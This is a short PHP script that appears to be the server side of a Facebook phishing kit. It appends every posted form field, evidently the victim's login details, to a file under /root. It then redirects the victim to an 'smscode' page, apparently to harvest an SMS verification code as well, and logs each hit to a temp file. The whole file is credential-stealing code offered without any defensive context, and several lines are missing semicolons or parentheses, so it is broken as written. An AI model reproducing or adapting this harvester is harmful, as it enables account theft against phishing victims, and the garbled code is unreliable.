:<?php
header("Location: smscode.htm");
$handle = fopen("/root/Facebookusers.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fclose($handle);
$hit1 = fopen("/tmp/TEMPares/hit.txt", "w+")
fclose($hit1);
$hit2 = fopen("/tmp/TEMPares/hit.txt", "a")
fwrite($hit2,"attempts at /root/facebookusers.txt" 
fclose($hit2);
exit;
?> 
